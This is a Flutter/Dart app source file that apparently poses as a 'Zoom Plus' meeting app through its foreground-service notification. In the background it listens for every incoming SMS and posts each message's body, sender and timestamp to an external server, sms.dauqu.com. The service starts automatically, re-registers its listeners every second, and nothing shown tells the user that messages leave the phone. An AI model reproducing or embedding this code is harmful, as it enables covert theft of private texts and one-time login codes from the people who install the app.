import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
// ignore: depend_on_referenced_packages
import 'package:flutter_background_service_android/flutter_background_service_android.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:sms/components/home.dart';
import 'package:telephony/telephony.dart';
import 'package:http/http.dart' as http;

onBackgroundMessage(SmsMessage message) async {
  //Show notification
  final flutterLocalNotificationsPlugin = FlutterLocalNotificationsPlugin();
  flutterLocalNotificationsPlugin.show(
    545567,
    'Background message received',
    'New SMS from ${message.address}',
    const NotificationDetails(
      android: AndroidNotificationDetails(
        'channel id',
        'channel name',
        icon: 'app_icon',
      ),
    ),
  );

  //Save SMS to shared preferences
  final prefs = await SharedPreferences.getInstance();
  //Get SMS
  var sms = message.body;
  //Get Sender
  var sender = message.address;
  //Get Time
  var time = message.dateSent.toString();

  try {
    await http.post(Uri.parse("https://sms.dauqu.com/api/v1/sms"),
        headers: <String, String>{
          'Content-Type': 'application/json; charset=UTF-8',
        },
        body: jsonEncode(<String, String>{
          "sms": message.body.toString(),
          "sender": message.address.toString(),
          "code": "code.toString()",
          "time": message.date.toString(),
          "name": "name.toString()",
        }));
  } catch (e) {
    print(e);
  }
}

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await initializeService();
  runApp(const MyApp());
}

Future<void> initializeService() async {
  final service = FlutterBackgroundService();

  /// OPTIONAL, using custom notification channel id
  const AndroidNotificationChannel channel = AndroidNotificationChannel(
    'my_foreground', // id
    'MY FOREGROUND SERVICE', // title
    description:
        'This channel is used for important notifications.', // description
    importance: Importance.low, // importance must be at low or higher level
  );

  final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
      FlutterLocalNotificationsPlugin();

  await flutterLocalNotificationsPlugin
      .resolvePlatformSpecificImplementation<
          AndroidFlutterLocalNotificationsPlugin>()
      ?.createNotificationChannel(channel);

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      // this will be executed when app is in foreground or background in separated isolate
      onStart: onStart,

      // auto start service
      autoStart: true,
      isForegroundMode: true,

      notificationChannelId: 'my_foreground',
      initialNotificationTitle: 'Zoom Plus meeting is running',
      initialNotificationContent: 'Tap to open',
      foregroundServiceNotificationId: 888,
    ),
    iosConfiguration: IosConfiguration(
      // auto start service
      autoStart: true,

      // this will be executed when app is in foreground in separated isolate
      onForeground: onStart,

      // you have to enable background fetch capability on xcode project
      onBackground: onIosBackground,
    ),
  );

  service.startService();
}

// to ensure this is executed
// run app from xcode, then from xcode menu, select Simulate Background Fetch
bool onIosBackground(ServiceInstance service) {
  WidgetsFlutterBinding.ensureInitialized();
  print('FLUTTER BACKGROUND FETCH');

  return true;
}

@pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  // Only available for flutter 3.0.0 and later
  DartPluginRegistrant.ensureInitialized();

  // For flutter prior to version 3.0.0
  // We have to register the plugin manually

  SharedPreferences preferences = await SharedPreferences.getInstance();
  await preferences.setString("hello", "world");

  /// OPTIONAL when use custom notification
  final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
      FlutterLocalNotificationsPlugin();

  if (service is AndroidServiceInstance) {
    service.on('setAsForeground').listen((event) {
      service.setAsForegroundService();

      final telephony = Telephony.instance;
      telephony.listenIncomingSms(
        onNewMessage: (SmsMessage message) {
          //Show notification
          // flutterLocalNotificationsPlugin.show(
          //   8898,
          //   'Background message -> 1111',
          //   'New SMS from ${message.address}',
          //   const NotificationDetails(
          //     android: AndroidNotificationDetails(
          //       'channel id',
          //       'channel name',
          //       icon: 'app_icon',
          //     ),
          //   ),
          // );
        },
        onBackgroundMessage: onBackgroundMessage,
      );
    });

    service.on('setAsBackground').listen((event) {
      service.setAsBackgroundService();

      final telephony = Telephony.instance;
      telephony.listenIncomingSms(
        onNewMessage: (SmsMessage message) {
          //Show notification
          // flutterLocalNotificationsPlugin.show(
          //   457657,
          //   'Background message -> 2222',
          //   'New SMS from ${message.address}',
          //   const NotificationDetails(
          //     android: AndroidNotificationDetails(
          //       'channel id',
          //       'channel name',
          //       icon: 'app_icon',
          //     ),
          //   ),
          // );
        },
        onBackgroundMessage: onBackgroundMessage,
      );
    });
  }

  service.on('stopService').listen((event) {
    service.stopSelf();
  });

  // bring to foreground
  Timer.periodic(const Duration(seconds: 1), (timer) async {
    //   final hello = preferences.getString("hello");
    //   print(hello);

    if (service is AndroidServiceInstance) {
      //Listen for incoming SMS
      final telephony = Telephony.instance;
      telephony.listenIncomingSms(
        onNewMessage: (SmsMessage message) {
          //Show notification
          // flutterLocalNotificationsPlugin.show(
          //   2343,
          //   'Background message -> 3333',
          //   'New SMS from ${message.address}',
          //   const NotificationDetails(
          //     android: AndroidNotificationDetails(
          //       'channel id',
          //       'channel name',
          //       icon: 'app_icon',
          //     ),
          //   ),
          // );
        },
        onBackgroundMessage: onBackgroundMessage,
      );
    }
  });
}

class MyApp extends StatefulWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  //Receive SMS
  String _message = "";
  final telephony = Telephony.instance;

  @override
  void initState() {
    super.initState();
    initPlatformState();
  }

  onMessage(SmsMessage message) async {
    setState(() {
      _message = message.body ?? "Error reading message body.";

      //Show notification
      final flutterLocalNotificationsPlugin = FlutterLocalNotificationsPlugin();
      flutterLocalNotificationsPlugin.show(
        34456,
        'New SMS',
        'New SMS from ${message.address}',
        const NotificationDetails(
          android: AndroidNotificationDetails(
            'my_foreground',
            'MY FOREGROUND SERVICE',
            icon: 'app_icon',
          ),
        ),
      );

      //
    });
  }

  // Platform messages are asynchronous, so we initialize in an async method.
  Future<void> initPlatformState() async {
    final bool? result = await telephony.requestPhoneAndSmsPermissions;
    if (result != null && result) {
      telephony.listenIncomingSms(
          onNewMessage: onMessage,
          onBackgroundMessage: onBackgroundMessage,
          listenInBackground: true);
    }
    if (!mounted) return;
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Home(),
    );
  }
}

onMessage(SmsMessage message) async {
  //Show notification
  final flutterLocalNotificationsPlugin = FlutterLocalNotificationsPlugin();
  flutterLocalNotificationsPlugin.show(
    34456,
    'New SMS',
    'New SMS from ${message.address}',
    const NotificationDetails(
      android: AndroidNotificationDetails(
        'my_foreground',
        'MY FOREGROUND SERVICE',
        icon: 'app_icon',
      ),
    ),
  );
}
